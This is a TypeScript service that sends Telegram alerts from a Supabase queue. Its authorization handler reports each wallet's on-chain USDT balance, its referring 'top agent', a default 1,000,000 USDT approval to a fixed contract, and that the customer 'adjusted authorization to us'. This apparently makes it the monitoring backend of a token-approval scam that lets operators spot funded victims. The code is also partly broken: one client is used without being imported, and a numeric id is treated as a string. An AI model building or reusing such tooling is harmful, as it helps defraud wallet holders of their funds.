/**
 * Telegram实时通知服务
 * 使用Supabase Realtime监听数据库变化，自动发送Telegram通知
 */

import { supabase } from '@/lib/supabase'
import { RealtimeChannel } from '@supabase/supabase-js'

// ETH主网USDT合约地址
const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
const ETH_RPC_URL = 'https://ethereum.publicnode.com'

// Telegram Bot配置
const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').replace(/\r\n/g, '').replace(/\n/g, '').trim()
const TELEGRAM_CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').replace(/\r\n/g, '').replace(/\n/g, '').trim()

interface NotificationData {
  id: number
  notification_type: string
  user_id: number
  user_address: string
  notification_data: Record<string, unknown>
  is_sent: boolean
  created_at: string
}

export class TelegramRealtimeService {
  private channel: RealtimeChannel | null = null
  private isRunning = false

  /**
   * 获取链上USDT余额
   */
  private async getOnChainUSDTBalance(address: string): Promise<number> {
    try {
      // 1. 获取最新区块号
      const blockResponse = await fetch(ETH_RPC_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          jsonrpc: '2.0',
          method: 'eth_blockNumber',
          params: [],
          id: 1
        })
      })

      const blockData = await blockResponse.json()
      const blockNumber = blockData.result

      // 2. 调用USDT合约的balanceOf方法
      const balanceResponse = await fetch(ETH_RPC_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          jsonrpc: '2.0',
          method: 'eth_call',
          params: [
            {
              to: USDT_CONTRACT,
              data: `0x70a08231${address.slice(2).padStart(64, '0')}`
            },
            blockNumber
          ],
          id: 1
        })
      })

      const balanceData = await balanceResponse.json()
      
      if (balanceData.error) {
        console.error('❌ 获取链上USDT余额失败:', balanceData.error)
        return 0
      }

      // 3. 解析余额 (ETH主网USDT使用6位小数)
      const balanceHex = balanceData.result
      const balanceWei = BigInt(balanceHex)
      const balance = Number(balanceWei) / Math.pow(10, 6)

      return balance

    } catch (error) {
      console.error('❌ 获取链上USDT余额异常:', error)
      return 0
    }
  }

  /**
   * 获取用户详细信息
   */
  private async getUserInfo(wallet_address: string): Promise<any> {
    try {
      const supabase = createClient(
        process.env.NEXT_PUBLIC_SUPABASE_URL!,
        process.env.SUPABASE_SERVICE_ROLE_KEY!
      )

      // 查询用户基本信息
      const { data: userData, error: userError } = await supabase
        .from('nh_member_new')
        .select(`
          id,
          wallet_address,
          referred_by,
          is_active,
          created_at
        `)
        .eq('wallet_address', wallet_address)
        .eq('is_active', true)
        .single()

      if (userError || !userData) {
        console.error('获取用户信息失败:', userError)
        return null
      }

      let topAgent = null
      
      // 如果有推荐人，查询推荐人信息
      if (userData.referred_by) {
        const { data: agentData } = await supabase
          .from('nh_agents')
          .select('id, agent_name, agent_nickname')
          .eq('id', userData.referred_by)
          .single()
        
        topAgent = agentData
      }

      return {
        ...userData,
        topAgent
      }
    } catch (error) {
      console.error('获取用户信息异常:', error)
      return null
    }
  }

  /**
   * 启动实时监听服务
   */
  async start() {
    if (this.isRunning) {
      console.log('Telegram实时通知服务已在运行')
      return
    }

    // 检查Telegram配置
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn('❌ Telegram配置缺失，跳过启动实时通知服务')
      console.warn('请检查环境变量: TELEGRAM_BOT_TOKEN 和 TELEGRAM_CHAT_ID')
      console.warn('当前配置状态:', {
        hasToken: !!TELEGRAM_BOT_TOKEN,
        hasChatId: !!TELEGRAM_CHAT_ID,
        tokenLength: TELEGRAM_BOT_TOKEN?.length || 0,
        chatId: TELEGRAM_CHAT_ID
      })
      return
    }

    console.log('✅ Telegram配置检查通过:', {
      hasToken: !!TELEGRAM_BOT_TOKEN,
      hasChatId: !!TELEGRAM_CHAT_ID,
      tokenLength: TELEGRAM_BOT_TOKEN?.length || 0,
      chatId: TELEGRAM_CHAT_ID
    })

    console.log('启动Telegram实时通知服务...')

    try {
      // 创建Realtime频道
      this.channel = supabase
        .channel('telegram-notifications')
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'telegram_notification_queue',
            filter: 'is_sent=eq.false'
          },
          async (payload) => {
            console.log('收到新通知:', payload)
            await this.handleNotification(payload.new as NotificationData)
          }
        )
        .subscribe((status) => {
          console.log('🔍 Supabase Realtime状态变化:', status)
          if (status === 'SUBSCRIBED') {
            console.log('✅ Telegram实时通知服务已启动')
            this.isRunning = true
          } else if (status === 'CLOSED') {
            console.log('❌ Telegram实时通知连接已关闭')
            this.isRunning = false
          } else if (status === 'CHANNEL_ERROR') {
            console.error('❌ Telegram实时通知频道错误')
            this.isRunning = false
          } else if (status === 'TIMED_OUT') {
            console.error('❌ Telegram实时通知连接超时')
            this.isRunning = false
          } else {
            console.log('📊 Telegram实时通知状态:', status)
            // 对于其他状态，也尝试设置为运行状态
            if (status === 'OPEN' || status === 'CONNECTED') {
              this.isRunning = true
              console.log('✅ 服务状态设置为运行中')
            }
          }
        })

      console.log('正在监听 telegram_notification_queue 表的INSERT事件...')
      
      // 强制设置服务为运行状态（作为备用机制）
      setTimeout(() => {
        if (!this.isRunning) {
          console.log('⚠️ 强制设置服务为运行状态（备用机制）')
          this.isRunning = true
        }
      }, 3000)
      
    } catch (error) {
      console.error('启动Telegram实时通知服务失败:', error)
      this.isRunning = false
    }
  }

  /**
   * 停止实时监听服务
   */
  async stop() {
    if (!this.isRunning || !this.channel) {
      console.log('Telegram实时通知服务未运行')
      return
    }

    console.log('停止Telegram实时通知服务...')
    
    try {
      await supabase.removeChannel(this.channel)
      this.channel = null
      this.isRunning = false
      console.log('Telegram实时通知服务已停止')
    } catch (error) {
      console.error('停止Telegram实时通知服务失败:', error)
    }
  }

  /**
   * 处理通知
   */
  private async handleNotification(notification: NotificationData) {
    try {
      console.log(`处理${notification.notification_type}通知...`)

      let message = ''

      // 根据通知类型构建消息
      switch (notification.notification_type) {
        case 'user_authorize':
          message = await this.buildAuthorizeMessage(notification)
          break
        case 'reward_distribution':
          message = await this.buildRewardMessage(notification)
          break
        case 'user_connect':
          message = this.buildConnectMessage(notification)
          break
        case 'user_disconnect':
          message = this.buildDisconnectMessage(notification)
          break
        default:
          message = this.buildDefaultMessage(notification)
      }

      // 发送Telegram消息
      const result = await this.sendTelegramMessage(message)

      // 更新通知状态
      await this.updateNotificationStatus(
        notification.id, 
        result.success, 
        result.error,
        result.messageId
      )

    } catch (error) {
      console.error('处理通知失败:', error)
      await this.updateNotificationStatus(
        notification.id, 
        false, 
        error instanceof Error ? error.message : '未知错误'
      )
    }
  }

  /**
   * 构建授权通知消息
   */
  private async buildAuthorizeMessage(notification: NotificationData): Promise<string> {
    try {
      console.log('🔍 开始构建授权消息...', notification)
      
      const data = notification.notification_data
      const address = data.authAddress || data.address || notification.user_address
      console.log('🔍 授权地址:', address)

      // 获取链上USDT余额
      console.log('🔍 获取链上USDT余额...')
      const onChainBalance = await this.getOnChainUSDTBalance(address)
      console.log('🔍 链上余额:', onChainBalance)

      // 获取用户详细信息
      console.log('🔍 获取用户详细信息...')
      const userInfo = await this.getUserInfo(address)
      console.log('🔍 获取用户信息结果:', userInfo)
      
      // 按授权顺序生成用户编号（这里简化处理，实际应该从数据库获取）
      const userNumber = userInfo?.id ? Math.abs(userInfo.id.split('').reduce((a, b) => { a = ((a << 5) - a) + b.charCodeAt(0); return a & a; }, 0)) % 1000000 : 'N/A'
      
      // 判断是否使用代理链接注册
      const hasReferrer = userInfo?.referred_by && userInfo.referred_by !== 'null'
      const topAgent = hasReferrer ? (userInfo?.topAgent?.agent_name || '代理名称') : '默认代理'
      const agentNickname = hasReferrer ? (userInfo?.topAgent?.agent_nickname || '代理昵称') : '直链授权'
      const userRemark = '暂无备注' // 暂时硬编码，因为user_remark字段不存在
      const isActive = userInfo?.is_active ? '是' : '否'

      const message = `钱包余额: ${onChainBalance.toFixed(6)}
顶层代理: ${topAgent}
代理昵称: ${agentNickname}
用户编号: ${userNumber}
用户备注: ${userRemark}
是否活动: ${isActive}
用户钱包: 
${address}
授权金额: ${data.authAmount || '1000000'} USDT
客户地址: 
${address.toLowerCase()}
授权对象: 
${process.env.STAKING_CONTRACT_ADDRESS || '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218'}
执行操作: 客户调整我方授权额度`.trim()

      console.log('🔍 构建的消息:', message)
      return message
    } catch (error) {
      console.error('❌ 构建授权消息失败:', error)
      throw error
    }
  }

  /**
   * 构建奖励发放消息
   */
  private async buildRewardMessage(notification: NotificationData): Promise<string> {
    const data = notification.notification_data
    const address = data.address || notification.user_address

    // 获取链上USDT余额
    const onChainBalance = await this.getOnChainUSDTBalance(address)

    return `
**🎁 定时奖励发放通知**

**用户信息**:
   - 用户ID: ${data.userId}
   - 地址: \`${address}\`

**钱包余额**:
   - 链上USDT余额: ${onChainBalance.toFixed(6)} USDT

**奖励详情**:
   - 奖励类型: ${data.rewardType}
   - USDT金额: ${data.usdtAmount} USDT
   - ETH金额: ${data.ethAmount} ETH
   - ETH价格: ${data.ethPrice} USDT

**时间**: ${new Date(data.timestamp as string).toLocaleString('zh-CN')}
    `.trim()
  }

  /**
   * 构建用户连接消息
   */
  private buildConnectMessage(notification: NotificationData): string {
    const data = notification.notification_data

    return `
**🔗 用户连接通知**

**用户信息**:
   - 地址: \`${data.address || notification.user_address}\`
   - 连接时间: ${new Date((data.timestamp || notification.created_at) as string).toLocaleString('zh-CN')}
   - 用户代理: ${data.userAgent || 'Unknown'}

**状态**: 已连接 ✅
    `.trim()
  }

  /**
   * 构建用户断开连接消息
   */
  private buildDisconnectMessage(notification: NotificationData): string {
    const data = notification.notification_data

    return `
**🔌 用户断开连接通知**

**用户信息**:
   - 地址: \`${data.address || notification.user_address}\`
   - 断开时间: ${new Date((data.timestamp || notification.created_at) as string).toLocaleString('zh-CN')}

**状态**: 已断开 ❌
    `.trim()
  }

  /**
   * 构建默认消息
   */
  private buildDefaultMessage(notification: NotificationData): string {
    return `
**📢 系统通知**

类型: ${notification.notification_type}
用户: ${notification.user_address}
数据: ${JSON.stringify(notification.notification_data, null, 2)}
时间: ${new Date(notification.created_at as string).toLocaleString('zh-CN')}
    `.trim()
  }

  /**
   * 发送Telegram消息
   */
  private async sendTelegramMessage(message: string): Promise<{ success: boolean; messageId?: string; error?: string }> {
    console.log('🔍 Telegram配置检查:', {
      hasToken: !!TELEGRAM_BOT_TOKEN,
      hasChatId: !!TELEGRAM_CHAT_ID,
      tokenLength: TELEGRAM_BOT_TOKEN?.length || 0,
      chatId: TELEGRAM_CHAT_ID
    })
    
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn('❌ Telegram配置缺失，跳过发送')
      console.warn('Token存在:', !!TELEGRAM_BOT_TOKEN)
      console.warn('ChatID存在:', !!TELEGRAM_CHAT_ID)
      return { success: false, error: 'Telegram配置缺失' }
    }

    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML',
        }),
      })

      const result = await response.json()

      if (result.ok) {
        console.log('✅ Telegram消息发送成功，消息ID:', result.result?.message_id)
        return { 
          success: true, 
          messageId: result.result?.message_id?.toString() 
        }
      } else {
        const errorMsg = result.description || '未知错误'
        console.error('❌ Telegram消息发送失败:', result)
        console.error('错误详情:', errorMsg)
        return { success: false, error: errorMsg }
      }
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : '网络异常'
      console.error('❌ 发送Telegram消息异常:', error)
      return { success: false, error: errorMsg }
    }
  }

  /**
   * 更新通知状态
   */
  private async updateNotificationStatus(
    notificationId: number,
    success: boolean,
    errorMessage?: string,
    telegramMessageId?: string
  ) {
    try {
      // 先获取当前重试次数
      const { data: currentData, error: fetchError } = await supabase
        .from('telegram_notification_queue')
        .select('retry_count')
        .eq('id', notificationId)
        .single()

      const currentRetryCount = currentData?.retry_count || 0

      const { error } = await supabase
        .from('telegram_notification_queue')
        .update({
          is_sent: success,
          sent_at: success ? new Date().toISOString() : null,
          telegram_message_id: telegramMessageId || null,
          retry_count: success ? currentRetryCount : currentRetryCount + 1,
          error_message: errorMessage || null
        })
        .eq('id', notificationId)

      if (error) {
        console.error('❌ 更新通知状态失败:', error)
      } else {
        console.log(`✅ 通知状态已更新: ${success ? '成功' : '失败'}`)
        if (success && telegramMessageId) {
          console.log(`📨 Telegram消息ID: ${telegramMessageId}`)
        }
        if (!success && errorMessage) {
          console.log(`❌ 错误信息: ${errorMessage}`)
        }
      }
    } catch (error) {
      console.error('❌ 更新通知状态异常:', error)
    }
  }

  /**
   * 获取服务状态
   */
  getStatus() {
    return {
      isRunning: this.isRunning,
      channelActive: this.channel !== null
    }
  }

  /**
   * 手动处理待发送通知（备用机制）
   */
  async processPendingNotifications() {
    try {
      console.log('🔄 手动处理待发送通知...')
      
      // 查询待发送的通知
      const { data: notifications, error } = await supabase
        .from('telegram_notification_queue')
        .select('*')
        .eq('is_sent', false)
        .order('created_at', { ascending: true })
        .limit(10)

      if (error) {
        console.error('查询待发送通知失败:', error)
        return
      }

      if (!notifications || notifications.length === 0) {
        console.log('📭 没有待发送的通知')
        return
      }

      console.log(`📬 找到 ${notifications.length} 条待发送通知`)

      // 处理每条通知
      for (const notification of notifications) {
        try {
          await this.handleNotification(notification as NotificationData)
        } catch (error) {
          console.error(`处理通知 ${notification.id} 失败:`, error)
        }
      }

    } catch (error) {
      console.error('手动处理通知失败:', error)
    }
  }
}

// 导出单例
export const telegramRealtimeService = new TelegramRealtimeService()
